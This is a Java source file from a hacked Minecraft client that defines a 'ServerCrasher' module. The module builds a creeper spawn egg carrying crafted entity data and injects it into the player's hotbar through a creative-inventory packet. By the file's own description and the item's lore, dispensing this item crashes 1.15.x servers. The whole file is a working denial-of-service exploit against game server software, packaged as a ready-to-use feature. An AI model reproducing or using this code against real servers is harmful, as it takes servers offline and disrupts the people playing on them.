/*
 * Copyright (C) 2014 - 2020 | Alexander01998 | All rights reserved.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import com.mojang.brigadier.exceptions.CommandSyntaxException;

import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.server.network.packet.CreativeInventoryActionC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.util.registry.Registry;
import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.hack.Hack;
import net.wurstclient.util.ChatUtils;

@SearchTags({"server crasher", "ServerCrepperSpawnEgg",
	"server creeper spawn egg"})
public final class ServerCrasherHack extends Hack
{
	public ServerCrasherHack()
	{
		super("ServerCrasher", "Generates an item that can\n"
			+ "crash 1.15.x servers.\n" + "\u00a7oCreative mode only.\u00a7r");
		
		setCategory(Category.ITEMS);
	}
	
	@Override
	public void onEnable()
	{
		if(!MC.player.abilities.creativeMode)
		{
			ChatUtils.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		
		Item item = Registry.ITEM.get(new Identifier("creeper_spawn_egg"));
		ItemStack stack = new ItemStack(item, 1);
		stack.setTag(createNBT());
		
		placeStackInHotbar(stack);
		setEnabled(false);
	}
	
	private CompoundTag createNBT()
	{
		try
		{
			return StringNbtReader.parse(
				"{display:{Lore:['\"\u00a7r1. Place item in dispenser.\"','\"\u00a7r2. Dispense item.\"','\"\u00a7r3. Ssss... BOOM!\"'],Name:'{\"text\":\"\u00a7rServer Creeper\"}'},EntityTag:{CustomName:\"TEST\",id:\"Creeper\",CustomNameVisible:1}}");
			
		}catch(CommandSyntaxException e)
		{
			throw new RuntimeException(e);
		}
	}
	
	private void placeStackInHotbar(ItemStack stack)
	{
		for(int i = 0; i < 9; i++)
		{
			if(!MC.player.inventory.getInvStack(i).isEmpty())
				continue;
			
			MC.player.networkHandler.sendPacket(
				new CreativeInventoryActionC2SPacket(36 + i, stack));
			ChatUtils.message("Item created.");
			return;
		}
		
		ChatUtils.error("Please clear a slot in your hotbar.");
	}
}
